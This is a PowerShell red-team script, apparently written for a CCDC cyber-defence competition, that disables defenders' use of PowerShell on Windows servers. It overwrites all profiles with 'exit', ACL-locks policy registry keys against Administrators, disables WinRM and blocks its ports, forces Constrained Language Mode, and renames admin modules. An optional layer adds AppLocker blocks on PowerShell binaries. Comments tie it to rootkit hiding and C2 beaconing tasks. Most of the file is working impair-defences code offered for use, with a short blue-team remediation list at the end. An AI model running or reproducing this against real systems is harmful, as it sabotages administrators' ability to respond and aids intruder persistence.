# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 -- Shell: ShellShock
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1059.001 (Command and Scripting: PowerShell -- policy + CLM lock)
#               T1546.013 (Event Triggered Execution: PowerShell Profile)
#               T1489     (Service Stop: WinRM)
#               T1562.004 (Impair Defenses: Disable or Modify Firewall -- WinRM ports)
#               T1565.001 (Data Manipulation: Stored Data -- module sabotage)
#               T1562.001 (Impair Defenses: Disable or Modify Tools -- AppLocker, -NukeIt only)
#
# Targets: Windows Server 2019, Server 2022, Windows 10
#
# Description:
#   Destroys the blue team's ability to use PowerShell as a remediation tool.
#   Run LAST -- after all other Phase 3 SetupScripts are deployed. Layers 1-5
#   do NOT intercept powershell.exe at the process level, so our own scheduled
#   tasks that use -NonInteractive -NoProfile -EncodedCommand remain unaffected.
#
#   -Tag77  : prefix all created files and rule names with $77 so r77Shadow
#             hides them. Run Rootkit_r77Shadow.ps1 BEFORE this script.
#
#   -NukeIt : enables Layer 6 (AppLocker binary block). This WILL break our
#             own PS-based scheduled tasks. Use only if C2 is stable and those
#             tasks no longer need to re-beacon.
#
#   LAYER 1 -- GROUP POLICY EXECUTION POLICY LOCK
#     HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell  ExecutionPolicy=Restricted
#     MachinePolicy (this hive) wins over -ExecutionPolicy Bypass on the CLI.
#     All .ps1 file loading blocked. Key ACL-locked after write.
#
#   LAYER 2 -- POWERSHELL PROFILE CORRUPTION
#     All four system-wide profile paths + every per-user profile found under
#     C:\Users\*\Documents\WindowsPowerShell\ overwritten with a single "exit"
#     statement. Interactive sessions die before blue team can type. Our tasks
#     use -NoProfile and are unaffected.
#
#   LAYER 3 -- WINRM / PSREMOTING DESTRUCTION
#     WinRM stopped and disabled. All PSRemoting session configurations
#     unregistered. TCP 5985/5986 blocked inbound and outbound via firewall.
#
#   LAYER 4 -- CONSTRAINED LANGUAGE MODE
#     __PSLockdownPolicy=4 written to HKLM Session Manager\Environment. All new
#     PS sessions enter CLM: Add-Type, COM objects, .NET reflection, and most
#     admin/remediation scripts fail. Basic cmdlets our tasks rely on still work.
#
#   LAYER 5 -- MODULE PATH SABOTAGE
#     PSModulePath machine env var cleared. Key admin modules renamed to .bak
#     under C:\Windows\System32\WindowsPowerShell\v1.0\Modules\. DENY Write
#     ACL applied to each .bak directory.
#
#   LAYER 6 -- APPLOCKER HARD BLOCK [-NukeIt only]
#     FilePathCondition DENY rules added to AppLocker for powershell.exe,
#     powershell_ise.exe, pwsh.exe. SrpV2 and AppIDSvc registry keys ACL-locked.
#     WARNING in output reminds operator this breaks our own PS tasks.
#
# Plan reference: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

[CmdletBinding()]
param(
    [switch]$NukeIt,
    [switch]$Tag77
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 -- Shell: ShellShock"
Write-Warn "================================================================"
if ($NukeIt) { Write-Warn " !! NukeIt -- AppLocker will block PS binaries (kills our tasks too)" }
if ($Tag77)  { Write-Info " ++ Tag77  -- artifacts prefixed with [dollar]77 (rootkit hides them)" }
Write-Host ""

# $77 prefix for all created artifacts when -Tag77 is set.
# Single-quote assignment keeps the dollar sign literal in the string value.
$Prefix = if ($Tag77) { '$77' } else { '' }

# WinPriv: enables SeTakeOwnershipPrivilege + SeRestorePrivilege for registry ACL work
if (-not ([System.Management.Automation.PSTypeName]'WinPriv').Type) {
    Add-Type @'
using System;
using System.Runtime.InteropServices;

public class WinPriv {
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool OpenProcessToken(IntPtr h, uint acc, out IntPtr tok);
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool LookupPrivilegeValue(string sys, string name, out long luid);
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool AdjustTokenPrivileges(IntPtr tok, bool dis,
        ref TP priv, uint z, IntPtr n1, IntPtr n2);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [StructLayout(LayoutKind.Sequential, Pack=1)]
    private struct LA { public long Luid; public uint Attr; }
    [StructLayout(LayoutKind.Sequential, Pack=1)]
    private struct TP  { public uint Count; public LA P; }

    public static bool Enable(string name) {
        IntPtr tok; long luid;
        if (!OpenProcessToken(GetCurrentProcess(), 0x28, out tok)) return false;
        if (!LookupPrivilegeValue(null, name, out luid)) return false;
        TP p = new TP { Count = 1, P = new LA { Luid = luid, Attr = 2 } };
        return AdjustTokenPrivileges(tok, false, ref p, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
'@
}

function Lock-RegistryKey {
    # Take ownership as SYSTEM, then deny Administrators write/delete access
    param([string]$SubKey)
    try {
        [WinPriv]::Enable("SeTakeOwnershipPrivilege") | Out-Null
        [WinPriv]::Enable("SeRestorePrivilege")       | Out-Null

        $hive = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
            [Microsoft.Win32.RegistryHive]::LocalMachine,
            [Microsoft.Win32.RegistryView]::Default)

        # Phase 1: take ownership
        $k = $hive.OpenSubKey($SubKey,
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::TakeOwnership)
        if (-not $k) { Write-Warn "Lock-RegistryKey: cannot open $SubKey for TakeOwnership"; return }
        $acl = $k.GetAccessControl([System.Security.AccessControl.AccessControlSections]::None)
        $sys = New-Object System.Security.Principal.SecurityIdentifier(
            [System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null)
        $acl.SetOwner($sys)
        $k.SetAccessControl($acl)
        $k.Close()

        # Phase 2: apply deny ACL
        $k = $hive.OpenSubKey($SubKey,
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        if (-not $k) { Write-Warn "Lock-RegistryKey: cannot open $SubKey for ChangePermissions"; return }
        $acl  = $k.GetAccessControl()
        $adm  = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
        $rights = [System.Security.AccessControl.RegistryRights]"SetValue,CreateSubKey,Delete"
        $inherit = [System.Security.AccessControl.InheritanceFlags]::None
        $prop    = [System.Security.AccessControl.PropagationFlags]::None
        $deny    = New-Object System.Security.AccessControl.RegistryAccessRule(
            $adm, $rights, $inherit, $prop,
            [System.Security.AccessControl.AccessControlType]::Deny)
        $acl.AddAccessRule($deny)
        $k.SetAccessControl($acl)
        $k.Close()
        $hive.Close()
        Write-Success "ACL locked: HKLM:\$SubKey"
    } catch {
        Write-Warn "Lock-RegistryKey failed ($SubKey): $_"
    }
}

function Lock-Path {
    # Deny Administrators Write + Delete on a file or directory
    param([string]$Path)
    try {
        $acl  = Get-Acl -Path $Path -ErrorAction Stop
        $adm  = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
            $adm, "Write,Delete", "None", "None", "Deny")
        $acl.AddAccessRule($rule)
        Set-Acl -Path $Path -AclObject $acl -ErrorAction Stop
        Write-Success "Locked: $Path"
    } catch {
        Write-Warn "Lock-Path failed ($Path): $_"
    }
}

# ============================================================
# Layer 1 -- Group Policy Execution Policy Lock
# ============================================================
Write-Section "Layer 1 -- Group Policy Execution Policy Lock"

$PSPol = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"

try {
    if (-not (Test-Path $PSPol)) {
        New-Item -Path $PSPol -Force | Out-Null
        Write-Info "Created policy key"
    }
    Set-ItemProperty -Path $PSPol -Name "ExecutionPolicy" -Value "Restricted" -Type String -Force
    Write-Success "ExecutionPolicy = Restricted (MachinePolicy -- overrides -ExecutionPolicy Bypass)"
} catch {
    Write-Err "Could not set execution policy key: $_"
}

# ACL-lock so removing the key requires taking ownership first
Lock-RegistryKey "SOFTWARE\Policies\Microsoft\Windows\PowerShell"

# ============================================================
# Layer 2 -- PowerShell Profile Corruption
# ============================================================
Write-Section "Layer 2 -- PowerShell Profile Corruption"

$ProfileContent = "exit"

# System-wide profiles (all hosts + current host variant, 32-bit and 64-bit PS)
$SystemProfiles = @(
    "$env:SystemRoot\System32\WindowsPowerShell\v1.0\profile.ps1",
    "$env:SystemRoot\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1",
    "$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\profile.ps1",
    "$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1"
)

foreach ($pf in $SystemProfiles) {
    try {
        if (-not (Test-Path $pf)) {
            New-Item -Path $pf -ItemType File -Force | Out-Null
        }
        [System.IO.File]::WriteAllText($pf, $ProfileContent)
        Write-Success "Profile poisoned: $pf"
        Lock-Path $pf
    } catch {
        Write-Warn "Could not corrupt profile $pf : $_"
    }
}

# Per-user profiles -- sweep all user home directories
$UserDirs = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue
foreach ($ud in $UserDirs) {
    $userProfilePaths = @(
        "$($ud.FullName)\Documents\WindowsPowerShell\profile.ps1",
        "$($ud.FullName)\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1",
        "$($ud.FullName)\OneDrive\Documents\WindowsPowerShell\profile.ps1",
        "$($ud.FullName)\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"
    )
    foreach ($pf in $userProfilePaths) {
        try {
            $pfDir = Split-Path $pf -Parent
            if (Test-Path $pfDir) {
                [System.IO.File]::WriteAllText($pf, $ProfileContent)
                Write-Success "User profile poisoned: $pf"
                Lock-Path $pf
            }
        } catch {
            Write-Warn "Could not corrupt $pf : $_"
        }
    }
}

# ============================================================
# Layer 3 -- WinRM / PSRemoting Destruction
# ============================================================
Write-Section "Layer 3 -- WinRM / PSRemoting Destruction"

# Stop and disable WinRM service
try {
    $wmSvc = Get-Service -Name WinRM -ErrorAction SilentlyContinue
    if ($wmSvc) {
        Stop-Service -Name WinRM -Force  -ErrorAction SilentlyContinue
        Set-Service  -Name WinRM -StartupType Disabled
        Write-Success "WinRM stopped and disabled"
    } else {
        Write-Info "WinRM service not found -- skipping"
    }
} catch {
    Write-Warn "WinRM stop/disable failed: $_"
}

# Unregister all PSRemoting session configurations
try {
    $configs = Get-PSSessionConfiguration -ErrorAction SilentlyContinue
    if ($configs) {
        $configs | ForEach-Object {
            try {
                Unregister-PSSessionConfiguration -Name $_.Name -Force -ErrorAction SilentlyContinue
                Write-Success "Unregistered session config: $($_.Name)"
            } catch {
                Write-Warn "Could not unregister $($_.Name): $_"
            }
        }
    } else {
        Write-Info "No PSSession configurations found"
    }
} catch {
    Write-Warn "PSSession config enumeration failed: $_"
}

# Firewall blocks on WinRM ports
$FwRules = @(
    @{ Name = "${Prefix}CCDC_Block_WinRM_In_5985";  Dir = "Inbound";  Port = 5985 },
    @{ Name = "${Prefix}CCDC_Block_WinRM_In_5986";  Dir = "Inbound";  Port = 5986 },
    @{ Name = "${Prefix}CCDC_Block_WinRM_Out_5985"; Dir = "Outbound"; Port = 5985 },
    @{ Name = "${Prefix}CCDC_Block_WinRM_Out_5986"; Dir = "Outbound"; Port = 5986 }
)

foreach ($r in $FwRules) {
    try {
        $existing = Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue
        if (-not $existing) {
            New-NetFirewallRule -DisplayName $r.Name `
                -Direction $r.Dir -Protocol TCP -LocalPort $r.Port `
                -Action Block -Profile Any -Enabled True | Out-Null
            Write-Success "Firewall blocked: $($r.Dir) TCP $($r.Port)"
        } else {
            Write-Info "Firewall rule already exists: $($r.Name)"
        }
    } catch {
        Write-Warn "Could not add firewall rule $($r.Name): $_"
    }
}

# ============================================================
# Layer 4 -- Constrained Language Mode
# ============================================================
Write-Section "Layer 4 -- Constrained Language Mode"

$EnvKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"

try {
    Set-ItemProperty -Path $EnvKey -Name "__PSLockdownPolicy" -Value "4" -Type String -Force
    Write-Success "__PSLockdownPolicy=4 -- all new PS sessions enter Constrained Language Mode"
    Write-Info "Basic cmdlets (Invoke-WebRequest, Set-ItemProperty, Start-Process) still work in CLM"
    Write-Warn "Locking Session Manager\Environment also blocks blue team from changing any machine env var"
} catch {
    Write-Err "Could not set __PSLockdownPolicy: $_"
}

Lock-RegistryKey "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"

# ============================================================
# Layer 5 -- Module Path Sabotage
# ============================================================
Write-Section "Layer 5 -- Module Path Sabotage"

# Clear machine-level PSModulePath so new sessions lose auto-discovery
try {
    [System.Environment]::SetEnvironmentVariable("PSModulePath", "", "Machine")
    Write-Success "PSModulePath machine env var cleared"
} catch {
    Write-Warn "Could not clear PSModulePath: $_"
}

# Rename key admin modules to .bak so Import-Module fails even if the path is known
$ModulesBase = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\Modules"
$TargetModules = @(
    "ActiveDirectory",
    "GroupPolicy",
    "NetSecurity",
    "ServerManager",
    "RemoteDesktop",
    "RemoteDesktopServices",
    "DHCPServer",
    "DNSServer",
    "FailoverClusters",
    "PKI",
    "NetAdapter",
    "NetTCPIP",
    "BestPractices"
)

foreach ($mod in $TargetModules) {
    $src = Join-Path $ModulesBase $mod
    $dst = "${src}.bak"
    if (Test-Path $src) {
        try {
            if (-not (Test-Path $dst)) {
                Rename-Item -Path $src -NewName "${mod}.bak" -Force
                Write-Success "Renamed: $mod -> ${mod}.bak"
            } else {
                Write-Info "${mod}.bak already exists -- skipping rename"
            }
            # DENY Write + Delete on the .bak directory for Administrators
            $aclBak = Get-Acl -Path $dst -ErrorAction Stop
            $adm    = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
            $rule   = New-Object System.Security.AccessControl.FileSystemAccessRule(
                $adm, "Write,Delete",
                [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit",
                [System.Security.AccessControl.PropagationFlags]::None,
                [System.Security.AccessControl.AccessControlType]::Deny)
            $aclBak.AddAccessRule($rule)
            Set-Acl -Path $dst -AclObject $aclBak -ErrorAction Stop
            Write-Success "Write/Delete denied on ${mod}.bak"
        } catch {
            Write-Warn "Could not process module $mod : $_"
        }
    } else {
        Write-Info "$mod not present at $ModulesBase -- skipping"
    }
}

# ============================================================
# Layer 6 -- AppLocker Hard Block [-NukeIt only]
# ============================================================
if ($NukeIt) {
    Write-Section "Layer 6 -- AppLocker Hard Block [NukeIt active]"
    Write-Warn "!! This layer blocks powershell.exe for ALL users including SYSTEM."
    Write-Warn "!! Our own PS-based scheduled tasks will stop beaconing after this."

    # Ensure AppIDSvc is running
    try {
        $appIdSvc = Get-Service -Name AppIDSvc -ErrorAction SilentlyContinue
        if ($appIdSvc) {
            Set-Service   -Name AppIDSvc -StartupType Automatic
            Start-Service -Name AppIDSvc -ErrorAction SilentlyContinue
            Write-Success "AppIDSvc started and set to Automatic"
        } else {
            Write-Warn "AppIDSvc not found -- AppLocker enforcement may not function"
        }
    } catch {
        Write-Warn "Could not start AppIDSvc: $_"
    }

    # Generate GUIDs for rule IDs
    $GuidPS   = [System.Guid]::NewGuid().ToString().ToUpper()
    $GuidISE  = [System.Guid]::NewGuid().ToString().ToUpper()
    $GuidPwsh = [System.Guid]::NewGuid().ToString().ToUpper()

    # Rule names (prefixed with $77 when -Tag77 is set)
    $RulePS   = "${Prefix}CCDC_Block_PS_powershell"
    $RuleISE  = "${Prefix}CCDC_Block_PS_ise"
    $RulePwsh = "${Prefix}CCDC_Block_PS_pwsh"

    # Check if an EXE RuleCollection already exists (from NoEscape or prior policy)
    $srpExeKey   = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe"
    $hasExeRules = (Test-Path $srpExeKey) -and
                   ((Get-ChildItem $srpExeKey -ErrorAction SilentlyContinue).Count -gt 0)

    if ($hasExeRules) {
        # Existing allow rules present -- merge only our deny rules
        $policyBody = @"
  <RuleCollection Type="Exe" EnforcementMode="Enabled">
    <FilePathRule Id="{$GuidPS}" Name="$RulePS"
        Description="CCDC: block powershell.exe" UserOrGroupSid="S-1-1-0" Action="Deny">
      <Conditions><FilePathCondition Path="*\powershell.exe"/></Conditions>
    </FilePathRule>
    <FilePathRule Id="{$GuidISE}" Name="$RuleISE"
        Description="CCDC: block powershell_ise.exe" UserOrGroupSid="S-1-1-0" Action="Deny">
      <Conditions><FilePathCondition Path="*\powershell_ise.exe"/></Conditions>
    </FilePathRule>
    <FilePathRule Id="{$GuidPwsh}" Name="$RulePwsh"
        Description="CCDC: block pwsh.exe" UserOrGroupSid="S-1-1-0" Action="Deny">
      <Conditions><FilePathCondition Path="*\pwsh.exe"/></Conditions>
    </FilePathRule>
  </RuleCollection>
"@
    } else {
        # No existing EXE rules -- add default allow rules so we don't lock out the whole system
        $GuidAllowWin = [System.Guid]::NewGuid().ToString().ToUpper()
        $GuidAllowPF  = [System.Guid]::NewGuid().ToString().ToUpper()
        Write-Info "No existing AppLocker EXE rules -- creating full policy with default allow rules"
        $policyBody = @"
  <RuleCollection Type="Exe" EnforcementMode="Enabled">
    <FilePathRule Id="{$GuidAllowWin}" Name="Allow WINDIR"
        Description="Default: allow Windows executables" UserOrGroupSid="S-1-1-0" Action="Allow">
      <Conditions><FilePathCondition Path="%WINDIR%\*"/></Conditions>
      <Exceptions>
        <FilePathCondition Path="%WINDIR%\*\powershell.exe"/>
        <FilePathCondition Path="%WINDIR%\*\powershell_ise.exe"/>
        <FilePathCondition Path="%WINDIR%\*\pwsh.exe"/>
      </Exceptions>
    </FilePathRule>
    <FilePathRule Id="{$GuidAllowPF}" Name="Allow ProgramFiles"
        Description="Default: allow Program Files executables" UserOrGroupSid="S-1-1-0" Action="Allow">
      <Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions>
    </FilePathRule>
    <FilePathRule Id="{$GuidPS}" Name="$RulePS"
        Description="CCDC: block powershell.exe" UserOrGroupSid="S-1-1-0" Action="Deny">
      <Conditions><FilePathCondition Path="*\powershell.exe"/></Conditions>
    </FilePathRule>
    <FilePathRule Id="{$GuidISE}" Name="$RuleISE"
        Description="CCDC: block powershell_ise.exe" UserOrGroupSid="S-1-1-0" Action="Deny">
      <Conditions><FilePathCondition Path="*\powershell_ise.exe"/></Conditions>
    </FilePathRule>
    <FilePathRule Id="{$GuidPwsh}" Name="$RulePwsh"
        Description="CCDC: block pwsh.exe" UserOrGroupSid="S-1-1-0" Action="Deny">
      <Conditions><FilePathCondition Path="*\pwsh.exe"/></Conditions>
    </FilePathRule>
  </RuleCollection>
"@
    }

    $policyXml = "<AppLockerPolicy Version=`"1`">$policyBody</AppLockerPolicy>"
    $XmlPath   = "$env:SystemRoot\Temp\${Prefix}CCDC_al_ps.xml"

    try {
        [System.IO.File]::WriteAllText($XmlPath, $policyXml)
        Set-AppLockerPolicy -XmlPolicy $XmlPath -Merge -ErrorAction Stop
        Write-Success "AppLocker deny rules merged -- powershell.exe, powershell_ise.exe, pwsh.exe blocked"
        Remove-Item $XmlPath -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Err "AppLocker policy merge failed: $_"
        Write-Warn "Policy XML left at $XmlPath for manual inspection"
    }

    # ACL-lock SrpV2 key (AppLocker rules stored here)
    if (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2") {
        Lock-RegistryKey "SOFTWARE\Policies\Microsoft\Windows\SrpV2"
    }

    # ACL-lock AppIDSvc service key so blue team cannot stop the service via registry
    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\AppIDSvc") {
        Lock-RegistryKey "SYSTEM\CurrentControlSet\Services\AppIDSvc"
    }

} else {
    Write-Section "Layer 6 -- AppLocker Hard Block [skipped -- use -NukeIt to enable]"
    Write-Info "Run with -NukeIt to add AppLocker DENY rules for powershell.exe/ise/pwsh.exe"
    Write-Warn "NukeIt will also break our own PS-based scheduled tasks"
}

# ============================================================
# Done
# ============================================================
Write-Host ""
Write-Success "================================================================"
Write-Success " ShellShock complete"
Write-Success "================================================================"
Write-Host ""
Write-Info "Layers applied:"
Write-Info "  L1: HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell  ExecutionPolicy=Restricted (ACL-locked)"
Write-Info "  L2: All system + per-user PS profiles overwritten with exit statement"
Write-Info "  L3: WinRM stopped/disabled, PSRemoting sessions cleared, TCP 5985/5986 blocked"
Write-Info "  L4: __PSLockdownPolicy=4 in Session Manager\Environment (CLM on all new sessions)"
Write-Info "  L5: PSModulePath cleared; AD/GPO/NetSec/ServerManager/DNS/DHCP modules renamed .bak"
if ($NukeIt) {
    Write-Info "  L6: AppLocker deny rules active for powershell.exe, powershell_ise.exe, pwsh.exe"
}
Write-Host ""
Write-Warn "Blue team remediation required:"
Write-Warn "  L1: Take ownership of HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell, delete key"
Write-Warn "  L2: Find and remove exit-only profiles from all 4 system paths + each user dir"
Write-Warn "  L3: Start-Service WinRM, Enable-PSRemoting -Force, remove FW rules on 5985/5986"
Write-Warn "  L4: Take ownership of Session Manager\Environment, delete __PSLockdownPolicy value"
Write-Warn "  L5: Restore PSModulePath, rename .bak module dirs back, remove deny ACLs"
if ($NukeIt) {
    Write-Warn "  L6: Take ownership of SrpV2 key, remove AppLocker deny rules, restart AppIDSvc"
}
